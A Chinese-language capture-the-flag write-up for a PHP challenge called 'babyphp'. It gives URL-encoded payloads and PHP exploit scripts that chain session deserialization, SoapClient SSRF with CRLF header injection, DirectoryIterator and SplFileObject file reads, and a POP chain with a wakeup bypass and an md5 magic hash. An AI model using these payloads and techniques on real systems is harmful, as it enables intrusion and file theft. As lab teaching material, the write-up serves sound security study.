# babyphp

> 本题思路是通过session反序列化漏洞将PHP原生类SoapClient写入session，`call_user_func(array(reset($_SESSION), $this->a));` 反序列化触发SoapClient的call方法，通过SoapClient去ssrf访问flag.php绕过`($_SERVER["REMOTE_ADDR"]==="127.0.0.1"`，`new $_GET['a']($_GET['b'])`的利用是通过原生类DirectoryIterator得到flag文件名及SplFileObject配合伪协议读取flag文件内容。



1、首先写入session

GET:

```
?baby=session.serialize_handler&d0g3=php_serialize
```

POST:

（PHPSESSID=b0e42afmolqd3dp3pqsidb38s5）

读文件名payload：

```
sess=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A16%3A%22http%3A%2F%2F127.0.0.1%22%3Bs%3A8%3A%22location%22%3Bs%3A58%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%3Fa%3DDirectoryIterator%26b%3Dglob%3A%2F%2F%2Ff%2A%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A50%3A%22test%0D%0ACookie%3A+PHPSESSID%3Db0e42afmolqd3dp3pqsidb38s5%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```

读文件内容payload：

```
sess=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A16%3A%22http%3A%2F%2F127.0.0.1%22%3Bs%3A8%3A%22location%22%3Bs%3A104%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%3Fa%3DSplFileObject%26b%3Dphp%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2Ff1111llllllaagg%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A50%3A%22test%0D%0ACookie%3A+PHPSESSID%3Db0e42afmolqd3dp3pqsidb38s5%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```

exp1.php：

```php
<?php
/*读文件名*/
$target = "http://127.0.0.1/flag.php?a=DirectoryIterator&b=glob:///f*";
/*读文件内容*/
//$target = "http://127.0.0.1/flag.php?a=SplFileObject&b=php://filter/convert.base64-encode/resource=/f1111llllllaagg";

$attack = new SoapClient(null,array(
    'location'=>$target,
    'uri'=>'http://127.0.0.1',
    'user_agent'=>"test\r\nCookie: PHPSESSID=uqhamshlif0ddaa3tep1tbu1d3"));
$payload = urlencode(serialize($attack));
echo '|'.$payload;
```



2、然后触发反序列化

POST:

```
pop=O:1:"B":3:{s:1:"a";s:1:"1";s:1:"b";R:2;s:1:"k";O:1:"C":2:{s:1:"a";s:3:"aaa";s:1:"c";O:1:"A":2:{s:1:"a";s:11:"0e215962017";s:1:"b";O:1:"C":2:{s:1:"a";s:3:"aaa";s:1:"c";N;};}}}
```

exp2.php:

考察变量覆盖、高版本wakeup绕过、md5。

```php
<?php
class A
{
    public $a;
    public $b;
    public function __construct()
    {
        $this->a = "0e215962017";
    }
}
class B
{
    public $a;
    public $b;
    public $k;
    public function __construct()
    {
        $this->a = "1";
        $this->b = &$this->a;
    }
}
class C
{
    public $a;
    public $c;
    public function __construct()
    {
        $this->a = "phpinfo";
    }
}
$a = new B;
$a->k = new C();
$a->k->c = new A();
$a->k->c->b = new C();

var_dump($a->b);
echo PHP_EOL;
echo serialize($a);

//phpinfo: O:1:"B":3:{s:1:"a";s:1:"1";s:1:"b";R:2;s:1:"k";O:1:"C":2:{s:1:"a";s:7:"phpinfo";s:1:"c";O:1:"A":2:{s:1:"a";s:11:"0e215962017";s:1:"b";O:1:"C":2:{s:1:"a";s:7:"phpinfo";s:1:"c";N;};}}}
//payload: O:1:"B":3:{s:1:"a";s:1:"1";s:1:"b";R:2;s:1:"k";O:1:"C":2:{s:1:"a";s:3:"aaa";s:1:"c";O:1:"A":2:{s:1:"a";s:11:"0e215962017";s:1:"b";O:1:"C":2:{s:1:"a";s:3:"aaa";s:1:"c";N;};}}}
```



最后访问一下index.php打印`$_SESSION`就可以看到

```
["F1AG"]=> string(52) "PwoKCiBkMGcze2I0YllfUGg5XzFzX1Yzcnl+X2VAc1khISF9Cg==" }
```

base64解密即可。
